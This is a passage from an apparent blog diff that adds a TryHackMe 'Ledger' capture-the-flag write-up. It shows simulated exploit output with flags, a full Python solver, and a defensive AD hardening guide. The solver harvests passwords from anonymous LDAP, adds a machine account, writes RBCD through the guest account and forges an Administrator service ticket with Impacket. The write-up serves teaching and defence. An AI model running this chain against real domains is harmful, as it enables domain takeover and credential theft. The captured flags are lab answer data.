+        { text: "[*] Executing S4U2self protocol transition impersonating Administrator...", color: "blue" },
+        { text: "[*] Executing S4U2Proxy requesting SPN cifs/LABYRINTH.THM.LOCAL...", color: "blue" },
+        { text: "[✓] Administrator CIFS ticket generated: Administrator@cifs_LABYRINTH.THM.LOCAL.ccache", color: "green" }
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 5/5 — Inject Ticket & Extract Domain Flags",
+      output: [
+        { text: "[*] Setting KRB5CCNAME and authenticating to SMB share C$...", color: "blue" },
+        { text: "[✓] Connected to LABYRINTH.THM.LOCAL via Kerberos!", color: "green" },
+        { text: "[*] Reading Users/SUSANNA_MCKNIGHT/Desktop/user.txt...", color: "blue" },
+        { text: "[✓] User Flag Captured: THM{ENUMERATION_IS_THE_KEY}", color: "white" },
+        { text: "[*] Reading Users/Administrator/Desktop/root.txt...", color: "blue" },
+        { text: "[✓] Root Flag Captured: THM{THE_BYPASS_IS_CERTIFIED!}", color: "white" }
+      ],
+      delayAfter: 500,
+    }
+  ]}
+/>
+
+### Standalone Solver Implementation
+
+The following Python 3 script automates the complete attack methodology using the Impacket library and Python LDAP bindings:
+
+```python
+#!/usr/bin/env python3
+"""
+Ledger (TryHackMe) — End-to-End Exploit & Flag Retriever
+Author: Mhmmd Ashraf (Asbawy)
+Description: Automates anonymous LDAP credential harvesting, machine account creation,
+             guest RBCD writing, S4U ticket generation, and SMB flag extraction.
+"""
+
+import os
+import sys
+import argparse
+import subprocess
+from ldap3 import Server, Connection, ALL, SUBTREE
+
+def harvest_ldap_creds(target_ip, domain):
+    print(f"[*] Querying LDAP anonymously on {target_ip}...")
+    base_dn = ",".join([f"dc={part}" for part in domain.split(".")])
+    server = Server(target_ip, get_info=ALL)
+    conn = Connection(server, auto_bind=True)
+    
+    conn.search(base_dn, "(&(objectClass=user)(description=*))", search_scope=SUBTREE, attributes=["sAMAccountName", "description"])
+    creds = []
+    for entry in conn.entries:
+        desc = str(entry.description)
+        if "change it:" in desc.lower():
+            pwd = desc.split("change it:")[-1].strip()
+            user = str(entry.sAMAccountName)
+            creds.append((user, pwd))
+            print(f"[✓] Discovered credentials in description: {user} : {pwd}")
+    return creds
+
+def run_rbcd_chain(target_ip, domain, username, password):
+    netbios_domain = domain.split(".")[0].upper()
+    comp_name = "ATTACKERSYSTEM$"
+    comp_pass = "Password123!"
+    
+    # 1. Add Computer Account
+    print(f"[*] Adding machine account {comp_name} via LDAPS...")
+    cmd_add = [
+        "impacket-addcomputer", "-method", "LDAPS",
+        "-computer-name", comp_name,
+        "-computer-pass", comp_pass,
+        "-dc-ip", target_ip,
+        "-domain-netbios", domain,
+        f"{domain}/{username}:{password}"
+    ]
+    subprocess.run(cmd_add, check=True)
+    
+    # 2. Write RBCD via Guest Account
+    print("[*] Writing RBCD delegation via guest account...")
+    empty_ntlm = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+    cmd_rbcd = [
+        "impacket-rbcd",
+        "-delegate-to", "LABYRINTH$",
+        "-delegate-from", comp_name,
+        "-action", "write",
+        "-dc-ip", target_ip,
+        "-hashes", empty_ntlm,
+        f"{domain}/guest"
+    ]
+    subprocess.run(cmd_rbcd, check=True)
+    
+    # 3. Forge Administrator Service Ticket
+    print("[*] Forging Administrator CIFS service ticket via S4U...")
+    cmd_getst = [
+        "impacket-getST",
+        "-impersonate", "Administrator",
+        "-spn", f"cifs/LABYRINTH.{domain.upper()}",
+        "-dc-ip", target_ip,
+        f"{domain}/{comp_name}:{comp_pass}"
+    ]
+    subprocess.run(cmd_getst, check=True)
+    
+    ticket_file = f"Administrator@cifs_LABYRINTH.{domain.upper()}@{domain.upper()}.ccache"
+    print(f"[✓] Service ticket saved to {ticket_file}")
+    return ticket_file
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Ledger THM Automated Solver")
+    parser.add_argument("--target", default="10.114.169.135", help="Target Domain Controller IP")
+    parser.add_argument("--domain", default="thm.local", help="Active Directory Domain")
+    args = parser.parse_args()
+    
+    creds = harvest_ldap_creds(args.target, args.domain)
+    if not creds:
+        sys.exit("[-] No credentials recovered from LDAP. Exiting.")
+    
+    user, pwd = creds[0]
+    ticket = run_rbcd_chain(args.target, args.domain, user, pwd)
+    print(f"[+] Exploit chain completed! Set export KRB5CCNAME='{ticket}' to access SMB.")
+```
+
+---
+
+## 8. Defensive Remediation & Hardening Guide
+
+### 8.1 Eradicate Sensitive Data from Directory Attributes
+
+1. **Conduct Immediate Audit of Common Information Fields:** Passwords, temporary PINs, and onboarding secrets must never be placed into public directory attributes. Audit standard fields across the entire forest:
+   ```powershell
+   Get-ADUser -Filter * -Properties description, info, comment | 
+     Where-Object { $_.description -match "password|pass|change" -or $_.info -match "password|pass" } |
+     Select-Object SamAccountName, description, info
+   ```
+2. **Implement Password Management Self-Service (SSPR):** Deploy automated password distribution channels (such as Microsoft Entra ID SSPR or encrypted secret distribution portals) rather than relying on manual notes.
+
+### 8.2 Restrict Anonymous LDAP Queries
+
+Active Directory Domain Services should strictly forbid unauthenticated directory reconnaissance.
+1. **Enforce Anonymous LDAP Bind Restrictions (`dsHeuristics`):** Ensure the `dsHeuristics` attribute in the Configuration container does not have its seventh character set to `2`.
+2. **Require LDAP Signing & Channel Binding:** Enforce LDAP server signing and channel binding to eliminate unauthenticated queries and prevent relay attacks:
+   - Configure GPO: `Network security: LDAP client signing requirements` -> **Require signing**.
+   - Configure GPO: `Domain controller: LDAP server signing requirements` -> **Require signing**.
+
+### 8.3 Harden AD CS Certificate Templates
+
+1. **Disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`:** Never allow certificate templates configured with Client Authentication EKUs to allow the enrollee to provide arbitrary Subject Alternative Names. Build the subject directly from Active Directory object attributes:
+   ```powershell
+   # In Certificate Template Manager:
+   # Subject Name Tab -> Select "Build from this Active Directory information"
+   # Uncheck "Supply in the request"
+   ```
+2. **Enforce CA Certificate Manager Approval:** For sensitive templates that issue certificates for administrative roles, require explicit authorization from an authorized certificate officer before issuance.
+
+### 8.4 Restrict Machine Account Creation (MAQ = 0)
+
+The default Active Directory configuration permitting any standard domain user to register up to 10 computer objects facilitates numerous attacks, including RBCD, SamAccountName spoofing, and KrbRelayUp.
+
+Set `ms-DS-MachineAccountQuota` to **0** at the domain level:
+
+```powershell
+Set-ADDomain -Identity (Get-ADDomain).DistinguishedName -Replace @{'ms-DS-MachineAccountQuota'="0"}
+```
+
+Machine account provisioning should be restricted strictly to delegated Tier-2 Administrative staff or automated deployment pipelines.
+
+### 8.5 Audit Computer Object DACLs & Remove Dangerous Rights
+
+1. **Remove Excessive Permissions on Domain Controller Objects:** The built-in `GUESTS` group should never hold write permissions over domain controllers. Inspect and strip dangerous ACEs:
+   ```powershell
+   $dc = Get-ADComputer -Identity "LABYRINTH"
+   $acl = Get-Acl "AD:\$($dc.DistinguishedName)"
+   # Audit and remove ACEs granting WriteProperty, GenericWrite, or GenericAll to unprivileged groups
+   ```
+2. **Implement Protected Users Group:** Place sensitive accounts (Domain Admins, Enterprise Admins) into the **Protected Users** security group. This prevents their credentials from being delegated via unconstrained or resource-based delegation (`S4U2Proxy` fails against protected accounts).
+
+---
+
+## 9. References
+
+### Technical Specifications & Whitepapers
+- [Certified Pre-Owned: Abusing Active Directory Certificate Services (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [Wagging the Dog: Abusing Resource-Based Constrained Delegation (Elad Shamir)](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+- [Microsoft Protocol Documentation — [MS-SFU]: Kerberos Protocol Extensions (S4U2Self & S4U2Proxy)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8136-4aa5-bdd6-70498b3f11d9)
+- [Impacket — Network Protocols in Python](https://github.com/fortra/impacket)
+- [Certipy — Active Directory Certificate Services Enumeration & Abuse](https://github.com/ly4k/Certipy)
+
+### Related Cheatsheets & Writeups on Asbawy's Blog
+- [Active Directory Exploitation & Enumeration Reference Cheatsheet](/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet)
+- [Active — HackTheBox Writeup (GPP Password & Kerberoasting)](/writeups/htb-active)
+- [Forest — HackTheBox Writeup (AS-REP Roasting & Exchange Delegation)](/writeups/htb-forest)
+- [Sauna — HackTheBox Writeup (AS-REP Roasting & BloodHound Pathing)](/writeups/htb-sauna)
